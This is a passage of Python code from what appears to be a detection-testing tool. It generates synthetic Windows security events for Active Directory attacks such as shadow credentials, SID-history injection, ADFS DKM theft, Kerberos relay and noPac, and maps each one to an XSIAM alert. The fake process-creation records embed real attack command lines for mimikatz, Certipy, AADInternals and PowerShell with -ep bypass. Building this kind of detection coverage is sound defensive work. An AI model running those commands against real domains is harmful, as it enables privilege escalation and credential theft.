        ("C:\\Users\\Public\\Certipy.exe",
         f"Certipy.exe shadow auto -u {actor['username']}@{dns_domain} "
         f"-p <password> -account {target['username']}"),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         f"powershell.exe -ep bypass -c \"$c = New-Object "
         f"System.Security.Cryptography.X509Certificates.X509Certificate2; "
         f"Set-ADComputer -Identity {target['username']} -Add "
         f"@{{'msDS-KeyCredentialLink'=$c}}\""),
    ])
    events.append(json.dumps(_build_4688(actor, config, process_name=tool[0],
                                         command_line=tool[1],
                                         logon_id=logon_id, ts=t)))
    t += random.uniform(0.5, 1.5)

    # DN-Binary form real AD stores for msDS-KeyCredentialLink: B:<len>:<hex>:<DN>
    # The Cortex analytic's Medium "Possible shadow credentials addition"
    # variation keys on the declared hex length being exactly 828; other lengths
    # select the Low variation. 828 is also the length of a genuine blob, so
    # emit a realistic KEY_CREDENTIAL blob.
    key_prefix = ("00020000200037AC7887BC49F44F1FD58C9A5CC99738DF4541AE5920BF"
                  "644370A50D")
    key_hex = key_prefix + os.urandom((828 - len(key_prefix)) // 2).hex()
    key_blob = f"B:828:{key_hex}:{target_dn}"
    events.append(json.dumps(_build_5136(
        actor, config,
        object_dn=target_dn, object_class="computer", object_guid=target_guid,
        attribute_name="msDS-KeyCredentialLink",
        attribute_value=key_blob,
        attribute_syntax_oid="2.5.5.7",
        operation_type="%%14674",
        op_correlation_id=op_corr_id, logon_id=logon_id, ts=t)))
    t += 0.01
    events.append(json.dumps(_attr_change_4662(
        actor, config, object_class=_GUID_CLASS_COMPUTER, object_dn=target_dn,
        attr_guid=_GUID_ATTR_KEY_CREDENTIAL,
        logon_id=logon_id, ts=t)))
    t += random.uniform(1.0, 3.0)

    issuer, serial, thumb = _pkinit_cert_fields(config)
    pkinit_user = {**target, "ip": actor.get("ip")}
    events.append(json.dumps(_build_4768(
        pkinit_user, config, ip_override=actor.get("ip"), encryption="0x12",
        preauth_type=_PREAUTH_PKINIT, cert_issuer=issuer, cert_serial=serial,
        cert_thumbprint=thumb, ts=t)))
    t += random.uniform(0.5, 1.5)
    events.append(json.dumps(_build_4769(
        pkinit_user, config, service_spn=f"ldap/{_get_dc_hostname(config)}",
        encryption="0x12", ip_override=actor.get("ip"), ts=t)))
    t += random.uniform(0.5, 1.0)

    events.append(json.dumps(_build_4689(actor, config, process_name=tool[0],
                                         logon_id=logon_id, ts=t)))
    return events


def _threat_pkinit_auth(config, session_context):
    """A user obtains a TGT with certificate (PKINIT) authentication.

    Fires "PKINIT TGT authentication request" (Informational), with the
    "Suspicious PKINIT TGT authentication request" (Medium) and "Abnormal
    PKINIT TGT authentication request" (Low) variations.

    Single-event detector: the only documented discriminator is that the TGT was
    obtained with PKINIT. Windows records that on 4768 as PreAuthType=16
    (PA-PK-AS-REQ) with CertIssuerName / CertSerialNumber / CertThumbprint
    populated. Those field names are the published 4768 EventData names.
    The shape is built from those names, not a captured PKINIT 4768; if this fires
    nothing, diff a real event before changing anything else.

    A rogue (non-enterprise) issuer is used half the time to exercise the
    certificate-anomaly path that the "Suspicious" variation likely keys on;
    the rest use the simulated enterprise CA.

    Sequence:
      1. 4768 PKINIT TGT for the user
      2. DC-side 4624 + endpoint 4624 (Kerberos, type 2)
      3. 4672 when the account is elevated
      4. 4769 TGS for a service
    """
    u = _pick_windows_user(session_context)
    if not u:
        return None

    rogue = random.random() < 0.5
    issuer, serial, thumb = _pkinit_cert_fields(config, rogue=rogue)
    src_ip = u.get("ip")

    events = []
    t = time.time()
    logon_id = _new_logon_id()

    events.append(json.dumps(_build_4768(
        u, config, ip_override=src_ip, encryption="0x12",
        preauth_type=_PREAUTH_PKINIT, cert_issuer=issuer, cert_serial=serial,
        cert_thumbprint=thumb, ts=t)))
    t += random.uniform(0.2, 0.8)
    events.append(json.dumps(_dc_logon_event(u, config, ip_override=src_ip,
                                             logon_id=logon_id, ts=t)))
    t += random.uniform(0.8, 1.5)
    events.append(json.dumps(_build_4624(u, config, logon_type=2,
                                         auth_pkg=_NEG_PACKAGE,
                                         target_logon_id=logon_id,
                                         elevated=True, ts=t)))
    t += 0.05
    events.append(json.dumps(_build_4672(u, config, logon_id=logon_id,
                                         is_admin=True, ts=t)))
    t += random.uniform(1.0, 3.0)

    spn = random.choice([s for s in _SERVICE_ACCOUNT_SPNS
                         if s.lower().startswith(("cifs/", "ldap/", "http/"))])
    events.append(json.dumps(_build_4769(u, config, service_spn=spn,
                                         encryption="0x12",
                                         ip_override=src_ip, ts=t)))
    return events


def _threat_sid_history_injection(config, session_context):
    """SID-history injection: add a privileged domain SID to a controlled account.

    Fires "User added SID History to an account" (Informational) and the
    "Suspicious SID History Addition" (Medium) variation.

    The injected SID is Domain Admins (RID 512) on the simulated domain, so the
    account is not a migration case — which is what separates the "Suspicious"
    variation from ordinary inter-domain migration.

    Signal coverage is again deliberately redundant: 5136 sIDHistory Value
    Added, 4662 Write Property naming the sIDHistory schema GUID, and the 4738
    that carries the final SidHistory value (the only one of the three with a
    first-class EventData field for it).

    Sequence:
      1. Attacker authenticates -> DC 4624 + endpoint 4624 + 4672
      2. 4688 mimikatz sid::add / PowerShell Set-ADUser
      3. 5136 sIDHistory Value Added
      4. 4662 Write Property (sIDHistory schema GUID)
      5. 4738 with SidHistory populated
      6. 4768 TGT for the now-elevated account
      7. 4689 process exit
    """
    actor = _pick_windows_user(session_context)
    if not actor:
        return None

    target = _pick_other_windows_user(session_context, actor) or actor
    base_dn = _domain_dn(config)
    target_dn = f"CN={target['username']},CN=Users,{base_dn}"
    target_guid = _new_logon_guid()
    target_sid = _stable_user_sid(target["username"])
    injected_sid = f"{_SYNTH_DOMAIN_SID}-512"

    events = []
    t = time.time()
    logon_id = _new_logon_id()
    op_corr_id = _new_logon_guid()

    events.append(json.dumps(_dc_logon_event(actor, config,
                                             ip_override=actor.get("ip"),
                                             logon_id=logon_id, ts=t)))
    t += 1.0
    events.append(json.dumps(_build_4624(actor, config, logon_type=2,
                                         auth_pkg=_NEG_PACKAGE,
                                         target_logon_id=logon_id,
                                         elevated=True, ts=t)))
    t += 0.05
    events.append(json.dumps(_build_4672(actor, config, logon_id=logon_id,
                                         is_admin=True, ts=t)))
    t += random.uniform(2.0, 5.0)

    tool = random.choice([
        ("C:\\Users\\Public\\mimikatz.exe",
         f"mimikatz.exe \"sid::add /sam:{target['username']} "
         f"/new:{injected_sid}\" \"exit\""),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         f"powershell.exe -ep bypass -c \"Set-ADUser -Identity "
         f"{target['username']} -Add @{{'sIDHistory'='{injected_sid}'}}\""),
    ])
    events.append(json.dumps(_build_4688(actor, config, process_name=tool[0],
                                         command_line=tool[1],
                                         logon_id=logon_id, ts=t)))
    t += random.uniform(0.5, 1.5)

    events.append(json.dumps(_build_5136(
        actor, config,
        object_dn=target_dn, object_class="user", object_guid=target_guid,
        attribute_name="sIDHistory", attribute_value=injected_sid,
        attribute_syntax_oid="2.5.5.17",
        operation_type="%%14674",
        op_correlation_id=op_corr_id, logon_id=logon_id, ts=t)))
    t += 0.01
    events.append(json.dumps(_attr_change_4662(
        actor, config, object_class=_GUID_CLASS_USER, object_dn=target_dn,
        attr_guid=_GUID_ATTR_SID_HISTORY,
        logon_id=logon_id, ts=t)))
    t += 0.01
    events.append(json.dumps(_build_4738(
        actor, config, target_username=target["username"],
        target_sid=target_sid, sam_account_name=target["username"],
        sid_history=injected_sid, logon_id=logon_id, ts=t)))
    t += random.uniform(1.0, 3.0)

    events.append(json.dumps(_build_4768(target, config,
                                         ip_override=actor.get("ip"),
                                         encryption="0x12", ts=t)))
    t += random.uniform(0.5, 1.0)
    events.append(json.dumps(_build_4689(actor, config, process_name=tool[0],
                                         logon_id=logon_id, ts=t)))
    return events


def _threat_adfs_dkm_access(config, session_context):
    """ADFS DKM key access — the first half of a Golden SAML attack.

    Fires "ADFS DKM Key Access" (Low). The analytic description names the exact
    signal: "ADFS DKM key attribute (thumbnailphoto) access in AD container".

    Shape assumptions: the DC audit record is a 4662 read
    of the DKM container, with ObjectType and Properties both the thumbnailPhoto
    schema GUID ({8d3bca50-...}), ObjectName the DKM container DN, and
    AccessMask 0x10 (Read Property). This matches public Golden SAML detection
    content and the analytic's own wording; the published page does not list
    EventData field names, so confirm against a real DKM read before changing
    anything else if it stays silent.

    Sequence:
      1. Attacker authenticates -> DC 4624 + endpoint 4624 + 4672
      2. 4688 AADInternals / mimikatz DKM export
      3. 4662 Read Property on CN=DKM,CN=ADFS,CN=Microsoft,CN=Program Data
      4. 4689 process exit
    """
    actor = _pick_windows_user(session_context)
    if not actor:
        return None

    base_dn = _domain_dn(config)
    dkm_dn = f"CN=DKM,CN=ADFS,CN=Microsoft,CN=Program Data,{base_dn}"

    events = []
    t = time.time()
    logon_id = _new_logon_id()

    events.append(json.dumps(_dc_logon_event(actor, config,
                                             ip_override=actor.get("ip"),
                                             logon_id=logon_id, ts=t)))
    t += 1.0
    events.append(json.dumps(_build_4624(actor, config, logon_type=2,
                                         auth_pkg=_NEG_PACKAGE,
                                         target_logon_id=logon_id,
                                         elevated=True, ts=t)))
    t += 0.05
    events.append(json.dumps(_build_4672(actor, config, logon_id=logon_id,
                                         is_admin=True, ts=t)))
    t += random.uniform(2.0, 5.0)

    tool = random.choice([
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "powershell.exe -ep bypass -c \"Import-Module AADInternals; "
         "Export-AADIntADFSConfiguration\""),
        ("C:\\Users\\Public\\mimikatz.exe",
         "mimikatz.exe \"lsadump::lsa /inject /name:adfs\" \"exit\""),
    ])
    events.append(json.dumps(_build_4688(actor, config, process_name=tool[0],
                                         command_line=tool[1],
                                         logon_id=logon_id, ts=t)))
    t += random.uniform(0.5, 1.5)

    events.append(json.dumps(_build_4662(
        actor, config,
        object_type="%" + _GUID_ATTR_THUMBNAIL_PHOTO,
        object_name=dkm_dn,
        access_mask="0x10",
        properties=f"{_GUID_ATTR_THUMBNAIL_PHOTO}\n",
        operation_type="Object Access",
        logon_id=logon_id, ts=t)))
    t += random.uniform(0.5, 1.0)

    events.append(json.dumps(_build_4689(actor, config, process_name=tool[0],
                                         logon_id=logon_id, ts=t)))
    return events


def _threat_kerberos_relay(config, session_context):
    """KrbRelayUp-style local Kerberos relay (LDAP relay -> local SYSTEM).

    Fires "Possible Kerberos relay attack" (Low). The published shape is a
    *local network logon*: EventID 4624, LogonType 3,
    AuthenticationPackageName "Kerberos", IpAddress "127.0.0.1" and
    TargetUserSid S-1-5-21-*-500 (the built-in Administrator RID). That is the
    Sigma rule "Potential Privilege Escalation via Local Kerberos Relay over
    LDAP" (749c9f5e-b353-4b90-a9c1-05243357ca4b) and Splunk "Windows Kerberos
    Local Successful Logon" (8309c3a8-...). Both also drop IpPort 0, so the
    endpoint logon keeps a real ephemeral port, and both exclude domain
    controllers, so the target is never DC01.

    The relayed ticket is for the target box's built-in LOCAL Administrator, so
    TargetDomainName is the computer name and the SID is the machine-local
    S-1-5-21-<machine>-500, not the domain SID. The DC-side events still show
    the machine account authenticating from the attacker's address.

    Sequence:
      1. 4768 TGT for the target's machine account, requested by the attacker
      2. DC-side 4624 for that machine account
      3. 4769 TGS for cifs/<target>
      4. 4624 type 3 Kerberos on the target, source 127.0.0.1, principal the
         local Administrator (S-1-5-21-*-500)
      5. 4672 SYSTEM-equivalent privileges for that logon
      6. 4688 whoami /priv under the relayed logon
      7. 4689 process exit
    """
    u = _pick_windows_user(session_context)
    if not u:
        return None

    # Never target a DC: both published rules exclude domain-controller logons.
    target_short = random.choice(["FS01", "FS02", "SQL01", "APP01"])
    target_fqdn = _fqdn(target_short, config)
    target_domain = target_short.upper()
    machine_user = {**u, "username": f"{target_short}$", "hostname": target_fqdn}
    local_admin = {**u, "username": "Administrator", "hostname": target_fqdn}
    local_admin_sid = _local_admin_sid(target_short)
    attacker_ip = u.get("ip") or "-"

    events = []
    t = time.time()
    logon_id = _new_logon_id()

    events.append(json.dumps(_build_4768(machine_user, config,
                                         ip_override=attacker_ip,
                                         encryption="0x12", ts=t)))
    t += random.uniform(0.2, 0.6)
    events.append(json.dumps(_dc_logon_event(machine_user, config,
                                             ip_override=attacker_ip,
                                             logon_id=logon_id, ts=t)))
    t += random.uniform(0.3, 0.8)
    events.append(json.dumps(_build_4769(
        machine_user, config, service_spn=f"cifs/{target_fqdn}",
        encryption="0x12", ip_override=attacker_ip, ts=t)))
    t += random.uniform(0.3, 0.8)

    events.append(json.dumps(_build_4624(
        local_admin, config, logon_type=3, auth_pkg=_KRB_PACKAGE,
        workstation_override=target_fqdn, ip_override="127.0.0.1",
        target_logon_id=logon_id, elevated=True,
        domain_override=target_domain,
        target_sid_override=local_admin_sid, ts=t)))
    t += 0.05
    events.append(json.dumps(_build_4672(local_admin, config,
                                         logon_id=logon_id, is_admin=True,
                                         sid_override=local_admin_sid,
                                         domain_override=target_domain, ts=t)))
    t += random.uniform(0.5, 1.5)

    proc = "C:\\Windows\\System32\\cmd.exe"
    events.append(json.dumps(_build_4688(local_admin, config,
                                         process_name=proc,
                                         command_line="cmd.exe /c whoami /priv",
                                         logon_id=logon_id,
                                         sid_override=local_admin_sid,
                                         domain_override=target_domain, ts=t)))
    t += random.uniform(0.5, 1.0)
    events.append(json.dumps(_build_4689(local_admin, config,
                                         process_name=proc,
                                         logon_id=logon_id,
                                         sid_override=local_admin_sid,
                                         domain_override=target_domain, ts=t)))
    return events


def _threat_spn_cleared(config, session_context):
    """Service principal names cleared from a machine account.

    Fires "SPNs cleared from a machine account" (Low) and the "for the first
    time" (Medium) variation. This is the SPN half of noPac (CVE-2021-42278),
    separated from the sAMAccountName rename so it can be exercised on its own.

    Signal coverage: 5136 servicePrincipalName Value Deleted pairs, 4662 Write
    Property naming the servicePrincipalName schema GUID, and a 4742 whose
    ServicePrincipalNames field is "-" (the state-carrying event).

    Sequence:
      1. Attacker authenticates -> DC 4624 + endpoint 4624 + 4672
      2. 4688 Set-ADComputer -ServicePrincipalName @{} / SetSPN -D
      3. 5136 servicePrincipalName Value Deleted for each SPN
      4. 4662 Write Property (servicePrincipalName schema GUID)
      5. 4742 with ServicePrincipalNames="-"
      6. 4689 process exit
    """
    actor = _pick_windows_user(session_context)
    if not actor:
        return None

    dns_domain = _get_dns_domain(config)
    base_dn = _domain_dn(config)
    suffix = random.randint(100, 9999)
    machine_name = random.choice(["WKSTMP", "DESKTOP", "CLIENT"]) + str(suffix)
    machine_sam = f"{machine_name}$"
    machine_dn = f"CN={machine_name},CN=Computers,{base_dn}"
    machine_guid = _new_logon_guid()
    machine_sid = _stable_user_sid(machine_name)
    machine_fqdn = f"{machine_name.lower()}.{dns_domain}"
    spns = [f"HOST/{machine_fqdn}", f"RestrictedKrbHost/{machine_fqdn}"]

    events = []
    t = time.time()
    logon_id = _new_logon_id()
    op_corr_id = _new_logon_guid()

    events.append(json.dumps(_dc_logon_event(actor, config,
                                             ip_override=actor.get("ip"),
                                             logon_id=logon_id, ts=t)))
    t += 1.0
    events.append(json.dumps(_build_4624(actor, config, logon_type=2,
                                         auth_pkg=_NEG_PACKAGE,
                                         target_logon_id=logon_id,
                                         elevated=True, ts=t)))
    t += 0.05
    events.append(json.dumps(_build_4672(actor, config, logon_id=logon_id,
                                         is_admin=True, ts=t)))
    t += random.uniform(2.0, 5.0)

    tool = random.choice([
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         f"powershell.exe -ep bypass -c \"Set-ADComputer {machine_name} "
         f"-ServicePrincipalName @{{}}\""),
        ("C:\\Windows\\System32\\setspn.exe",
         f"setspn.exe -D HOST/{machine_fqdn} {machine_sam}"),
    ])
    events.append(json.dumps(_build_4688(actor, config, process_name=tool[0],
                                         command_line=tool[1],
                                         logon_id=logon_id, ts=t)))
    t += random.uniform(0.5, 1.5)

    for spn in spns:
        events.append(json.dumps(_build_5136(
            actor, config,
            object_dn=machine_dn, object_class="computer",
            object_guid=machine_guid,
            attribute_name="servicePrincipalName", attribute_value=spn,
            attribute_syntax_oid="2.5.5.12",
            operation_type="%%14675",
            op_correlation_id=op_corr_id, logon_id=logon_id, ts=t)))
        t += 0.001

    events.append(json.dumps(_attr_change_4662(
        actor, config, object_class=_GUID_CLASS_COMPUTER, object_dn=machine_dn,
        attr_guid=_GUID_ATTR_SERVICE_PRINCIPAL,
        logon_id=logon_id, ts=t)))
    t += 0.01
    events.append(json.dumps(_build_4742(
        actor, config, target_computer_name=machine_sam, target_sid=machine_sid,
        sam_account_name=machine_sam, dns_host_name=machine_fqdn, spns="-",
        logon_id=logon_id, ts=t)))
    t += random.uniform(0.5, 1.0)

    events.append(json.dumps(_build_4689(actor, config, process_name=tool[0],
                                         logon_id=logon_id, ts=t)))
    return events


def _threat_suspicious_sam_change(config, session_context):
    """Machine account renamed to a sAMAccountName with no trailing dollar sign.

    Fires "Suspicious sAMAccountName change" (Low); when the new name is a
    domain controller's hostname it also covers the "to DC hostname" (Medium)
    variation. The rename is the other half of noPac, and a missing trailing "$"
    is what lets the KDC resolve the principal as a user/DC rather than a
    machine account.

    Signal coverage: 5136 sAMAccountName Value Deleted/Added pair, 4662 Write
    Property naming the sAMAccountName schema GUID, and a 4742 whose
    SamAccountName field carries the new (dollar-less) name.

    Sequence:
      1. Attacker authenticates -> DC 4624 + endpoint 4624 + 4672
      2. 4688 Set-ADComputer -SamAccountName / Rename-ADObject
      3. 5136 sAMAccountName old -> new
      4. 4662 Write Property (sAMAccountName schema GUID)
      5. 4742 with the renamed SamAccountName
      6. 4768 TGT for the renamed principal
      7. 4689 process exit
    """
    actor = _pick_windows_user(session_context)
    if not actor:
        return None

    dns_domain = _get_dns_domain(config)
    base_dn = _domain_dn(config)
    suffix = random.randint(100, 9999)
    machine_name = random.choice(["WKSTMP", "DESKTOP", "CLIENT"]) + str(suffix)
    machine_sam = f"{machine_name}$"
    machine_dn = f"CN={machine_name},CN=Computers,{base_dn}"
    machine_guid = _new_logon_guid()
    machine_sid = _stable_user_sid(machine_name)
    machine_fqdn = f"{machine_name.lower()}.{dns_domain}"

    # 70% a generic dollar-less name (the base Low variation), 30% the DC's
    # hostname (the Medium "to DC hostname" variation).
    new_sam = _get_dc_short(config) if random.random() < 0.3 else machine_name

    events = []
    t = time.time()
    logon_id = _new_logon_id()
    op_corr_id = _new_logon_guid()

    events.append(json.dumps(_dc_logon_event(actor, config,
                                             ip_override=actor.get("ip"),
                                             logon_id=logon_id, ts=t)))
    t += 1.0
    events.append(json.dumps(_build_4624(actor, config, logon_type=2,
                                         auth_pkg=_NEG_PACKAGE,
                                         target_logon_id=logon_id,
                                         elevated=True, ts=t)))
    t += 0.05
    events.append(json.dumps(_build_4672(actor, config, logon_id=logon_id,
                                         is_admin=True, ts=t)))
    t += random.uniform(2.0, 5.0)

    tool = random.choice([
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         f"powershell.exe -ep bypass -c \"Set-ADComputer {machine_name} "
         f"-SamAccountName '{new_sam}'\""),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         f"powershell.exe -ep bypass -c \"Rename-ADObject -Identity "
         f"'{machine_dn}' -NewName '{new_sam}'\""),
    ])
    events.append(json.dumps(_build_4688(actor, config, process_name=tool[0],
                                         command_line=tool[1],
                                         logon_id=logon_id, ts=t)))
    t += random.uniform(0.5, 1.5)

    events.append(json.dumps(_build_5136(
        actor, config,
        object_dn=machine_dn, object_class="computer", object_guid=machine_guid,
        attribute_name="sAMAccountName", attribute_value=machine_sam,
        attribute_syntax_oid="2.5.5.12",
        operation_type="%%14675",
        op_correlation_id=op_corr_id, logon_id=logon_id, ts=t)))
    t += 0.001
    events.append(json.dumps(_build_5136(
        actor, config,
        object_dn=machine_dn, object_class="computer", object_guid=machine_guid,
        attribute_name="sAMAccountName", attribute_value=new_sam,
        attribute_syntax_oid="2.5.5.12",
        operation_type="%%14674",
        op_correlation_id=op_corr_id, logon_id=logon_id, ts=t)))
    t += 0.01
    events.append(json.dumps(_attr_change_4662(
        actor, config, object_class=_GUID_CLASS_COMPUTER, object_dn=machine_dn,
        attr_guid=_GUID_ATTR_SAM_ACCOUNT_NAME,
        logon_id=logon_id, ts=t)))
    t += 0.01
    events.append(json.dumps(_build_4742(
        actor, config, target_computer_name=new_sam, target_sid=machine_sid,
        sam_account_name=new_sam, dns_host_name="-",
        logon_id=logon_id, ts=t)))
    t += 0.01
    # 4781 is the event the analytic keys on: one record carrying old -> new on
    # the same object.
    events.append(json.dumps(_build_4781(
        actor, config, old_target_user_name=machine_sam,
        new_target_user_name=new_sam, target_sid=machine_sid,
        logon_id=logon_id, ts=t)))
    t += random.uniform(0.3, 0.8)

    renamed_user = {**actor, "username": new_sam, "hostname": machine_fqdn}
    events.append(json.dumps(_build_4768(renamed_user, config,
                                         ip_override=actor.get("ip"),
                                         encryption="0x12", ts=t)))
    t += random.uniform(0.5, 1.0)
    events.append(json.dumps(_build_4689(actor, config, process_name=tool[0],
                                         logon_id=logon_id, ts=t)))
    return events


_THREAT_WEIGHTS = {
    "rogue_forest_trust":                3,
    "existing_trust_sid_filter_downgrade": 3,
    "dcshadow":                          3,
    "golden_ticket":                     4,
    "malicious_gpo":                     3,
    "as_rep_roasting":         8,
    "account_lockout":             5,
    "suspicious_account_lockout":  4,
    "dcsync":                      4,
    "priv_group_then_dcsync":      2,
    "dmsa_privesc":            3,
    "priv_group_addition":         5,
    "machine_account_to_domain_admins": 3,
    "wip_adminsdholder_acl_modification": 3,
    "wip_irregular_service_tgs":   6,
    "irregular_tgt_burst":         4,
    "sms_admins_addition":         3,
    "sms_admins_add_remove":       3,
    "wip_sccm_container_recon":    3,
    "dnshostname_spoofing":        3,
    "samaccountname_spoofing":     3,
    "delegation_change":           3,
    "new_machine_delegation":      3,
    "multiple_service_tickets":    5,
    "priv_group_add_remove":       4,
    "wip_priv_cert_request":       3,
    "suspicious_account_creation": 5,
    "mass_account_deletion":       4,
    "sensitive_password_reset": 4,
    "wip_password_never_expires":  3,
    "default_account_enabled":     3,
    # LSASS handle access is a high-signal credential-dumping path, so it is
    # weighted with the other privilege-abuse threats rather than rarely.
    "lsass_handle_access":         5,
    "account_access_removal":      3,
    "mailbox_export":              3,
    "mailbox_export_log_removal":  3,
    "mailbox_cas_change":          3,
    "psexec_lateral":              4,
    "remote_scheduled_task":       3,
    "share_enumeration":           3,
    "malicious_service_install":   3,
    # AD CS / Kerberos / directory-attribute abuse (added 2026-11-01)
    "shadow_credentials":          3,
    "pkinit_auth":                 3,
    "sid_history_injection":       3,
    "adfs_dkm_access":             2,
    "kerberos_relay":              3,
    "spn_cleared":                 3,
    "suspicious_sam_change":       3,
}

_THREAT_GENERATORS = {
    "rogue_forest_trust":               _threat_rogue_forest_trust,
    "existing_trust_sid_filter_downgrade": _threat_existing_trust_sid_filter_downgrade,
    "dcshadow":                         _threat_dcshadow,
    "golden_ticket":                    _threat_golden_ticket,
    "malicious_gpo":                    _threat_malicious_gpo,
    "as_rep_roasting":             _threat_as_rep_roasting,
    "account_lockout":                  _threat_account_lockout,
    "suspicious_account_lockout":       _threat_suspicious_account_lockout,
    "dcsync":                           _threat_dcsync,
    "priv_group_then_dcsync":           _threat_priv_group_then_dcsync,
    "dmsa_privesc":                 _threat_dmsa_privesc,
    "priv_group_addition":              _threat_priv_group_addition,
    "machine_account_to_domain_admins": _threat_machine_account_to_domain_admins,
    "wip_adminsdholder_acl_modification": _threat_adminsdholder_acl_modification,
    "wip_irregular_service_tgs":        _threat_irregular_service_tgs,
    "irregular_tgt_burst":              _threat_irregular_tgt_burst,
    "sms_admins_addition":              _threat_sms_admins_addition,
    "sms_admins_add_remove":            _threat_sms_admins_add_remove,
    "wip_sccm_container_recon":         _threat_sccm_container_recon,
    "dnshostname_spoofing":             _threat_dnshostname_spoofing,
    "samaccountname_spoofing":          _threat_samaccountname_spoofing,
    "delegation_change":                _threat_delegation_change,
    "new_machine_delegation":           _threat_new_machine_delegation,
    "multiple_service_tickets":         _threat_multiple_service_tickets,
    "priv_group_add_remove":            _threat_priv_group_add_remove,
    "wip_priv_cert_request":            _threat_priv_cert_request,
    "suspicious_account_creation":      _threat_suspicious_account_creation,
    "mass_account_deletion":            _threat_mass_account_deletion,
    "sensitive_password_reset":     _threat_sensitive_password_reset,
    "wip_password_never_expires":       _threat_password_never_expires,
    "default_account_enabled":          _threat_default_account_enabled,
    "lsass_handle_access":              _threat_lsass_handle_access,
    "account_access_removal":           _threat_account_access_removal,
    "mailbox_export":                   _threat_mailbox_export,
    "mailbox_export_log_removal":       _threat_mailbox_export_log_removal,
    "mailbox_cas_change":               _threat_mailbox_cas_change,
    "psexec_lateral":                   _threat_psexec_lateral,
    "remote_scheduled_task":            _threat_remote_scheduled_task,
    "share_enumeration":                _threat_share_enumeration,
    "malicious_service_install":        _threat_malicious_service_install,
    "shadow_credentials":               _threat_shadow_credentials,
    "pkinit_auth":                      _threat_pkinit_auth,
    "sid_history_injection":            _threat_sid_history_injection,
    "adfs_dkm_access":                  _threat_adfs_dkm_access,
    "kerberos_relay":                   _threat_kerberos_relay,
    "spn_cleared":                      _threat_spn_cleared,
    "suspicious_sam_change":            _threat_suspicious_sam_change,
}
_THREAT_GENERATORS = {k: _ending_by_now(v) for k, v in _THREAT_GENERATORS.items()}


# Threat -> the XSIAM analytics alert it is built to trigger. Only these threats are
# offered for on-demand firing (dashboard / MCP / CLI, via modules/threat_catalog.py);
# every threat still runs in long-running sessions. Names are the XSIAM alert names,
# mapped against the Cortex "Windows Event Collector" analytics list.
ANALYTIC_ALERTS = {
    # Unmapped (background only): lsass_handle_access and account_access_removal (no
    # Windows Event Collector analytic; LSASS access is an XDR-agent detection), and
    # wip_irregular_service_tgs -- it only ever raises the weak-encryption alert that
    # multiple_service_tickets owns; irregular_tgt_burst covers its intended target.
    # Also unmapped: psexec_lateral, remote_scheduled_task, share_enumeration and
    # malicious_service_install -- no WEC analytic reads 4698/7045/5140/5145.
    "as_rep_roasting":             "An excessive number of TGT requests were sent for users that do not require Kerberos pre-authentication",
    "account_lockout":             "Multiple user accounts failed login due to account lockouts",
    "suspicious_account_lockout":  "Excessive account lockouts on suspicious users",
    "dcsync":                      "Possible DCSync by an unusual user",
    "dmsa_privesc":                "Possible Privilege Escalation using Delegated MSA account attempt",
    "priv_group_addition":         "User added to a Windows privileged group",
    "machine_account_to_domain_admins": "Machine account was added to a domain admins group",
    "wip_adminsdholder_acl_modification": "Suspicious modification of the AdminSDHolder's ACL",
    "irregular_tgt_burst":         "A user sent an excessive number of TGT requests to irregular services",
    "sms_admins_addition":         "User added to the SMS Admins local group",
    "sms_admins_add_remove":       "User added to the SMS Admins group and removed",
    "wip_sccm_container_recon":    "Suspicious access of the System Management Container",
    "dnshostname_spoofing":        "Suspicious dNSHostName attribute change to DC name",
    "samaccountname_spoofing":     "Service ticket request with a spoofed sAMAccountName",
    "delegation_change":           "User account delegation to KRBTGT",
    "new_machine_delegation":      "A new machine attempted Kerberos delegation",
    "multiple_service_tickets":    "Abnormal issuance of weakly encrypted service tickets to a user",
    "priv_group_add_remove":       "Rare privileged group addition and removal",
    "wip_priv_cert_request":       "Privileged certificate request via certificate template",
    "suspicious_account_creation": "Suspicious hidden user created",
    "mass_account_deletion":       "A user deleted multiple users for the first time",
    "sensitive_password_reset":    "Sensitive account password reset attempt for the first time",
    "wip_password_never_expires":  "A user account was modified to password never expires",
    "default_account_enabled":     "A user enabled the Windows DefaultAccount",
    "mailbox_export":              "PowerShell used to export mailbox contents",
    "mailbox_export_log_removal":  "PowerShell used to remove mailbox export request logs",
    "mailbox_cas_change":          "Mailbox Client Access Setting (CAS) changed",
    # AD CS / Kerberos / directory-attribute abuse (added 2026-11-01).
    # The primary name is the Low+ variation the generator is built to raise;
    # the base Informational name and any sibling variation are in SECONDARY.
    "shadow_credentials":          "Possible shadow credentials addition",
    "pkinit_auth":                 "Suspicious PKINIT TGT authentication request",
    "sid_history_injection":       "Suspicious SID History Addition",
    "adfs_dkm_access":             "ADFS DKM Key Access",
    "kerberos_relay":              "Possible Kerberos relay attack",
    "spn_cleared":                 "SPNs cleared from a machine account for the first time",
    "suspicious_sam_change":       "Suspicious sAMAccountName change to DC hostname",
}

# Further analytics a threat's events are built to satisfy, beyond its ANALYTIC_ALERTS
# entry. Coverage reporting reads these (the on-demand label uses the primary only).
ANALYTIC_ALERTS_SECONDARY = {
    "suspicious_account_creation": [
        "Short-lived user account",                         # 1-3 of the accounts deleted
        "Multiple suspicious user accounts were created",
        "Suspicious domain user account creation",
        "Local user account creation",
    ],
    # The noPac generators were already emitting every shape these analytics
    # need; they were simply never declared, so coverage counted them as gaps.
    "samaccountname_spoofing": [
        "TGT request with a spoofed sAMAccountName - Event log",
        "Suspicious sAMAccountName change",
        "Suspicious sAMAccountName change to DC hostname",
        "SPNs cleared from a machine account",
        "SPNs cleared from a machine account for the first time",
    ],
    "dnshostname_spoofing": [
        "Suspicious account attribute modification that matches that of another account",
        "Suspicious account attribute modification that matches that of a sensitive machine account",
    ],
    "multiple_service_tickets": [
        "A user requested multiple service tickets",
        "Abnormal issuance of service tickets to a user",
    ],
    "shadow_credentials": [
        "Key credential attribute modification",
        "Key credential attribute addition",
        "PKINIT TGT authentication request",
        "Suspicious PKINIT TGT authentication request",
        "Abnormal PKINIT TGT authentication request",
    ],
    "pkinit_auth": [
        "PKINIT TGT authentication request",
        "Abnormal PKINIT TGT authentication request",
    ],
    "sid_history_injection": [
        "User added SID History to an account",
    ],
    "spn_cleared": [
        "SPNs cleared from a machine account",
    ],
    "suspicious_sam_change": [
